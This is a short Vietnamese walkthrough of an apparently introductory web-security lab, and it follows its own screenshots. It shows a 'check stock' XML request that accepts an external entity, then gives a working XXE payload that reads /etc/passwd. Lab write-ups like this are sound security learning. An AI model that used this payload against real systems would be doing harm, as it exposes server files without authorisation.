![image](https://github.com/user-attachments/assets/79029734-c0b2-4d06-9705-391a173f55e9)

Vào challenge này bạn có thể thấy được rằng nó mô tả như trên, vậy ta hãy bắt gói tin `check stock` xem sao nhé.

![image](https://github.com/user-attachments/assets/20e8aa45-d9b9-455c-91db-d0c7a87e2acb)

Ta có thể thấy được rằng chương trình nó dùng xml để trao đổi api. Nhưng ở challenge này chỉ là challenge khởi đầu và server nó không validate cái gì hết, dẫn đến có thể bị `xxe`.

Ta có thể truyền vào 1 DTD (external entity) dẫn đến xxe. Và ta nhớ phải gọi nó nhé `&xxe;`. Nếu không nó sẽ không chạy đâu.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

![image](https://github.com/user-attachments/assets/b10d01a5-2ba1-4770-8044-d03dd40ee8d6)

Vậy là ta đã thành công rồi.

![image](https://github.com/user-attachments/assets/b2750031-43d7-4be7-9e09-0fc7a6b3b247)
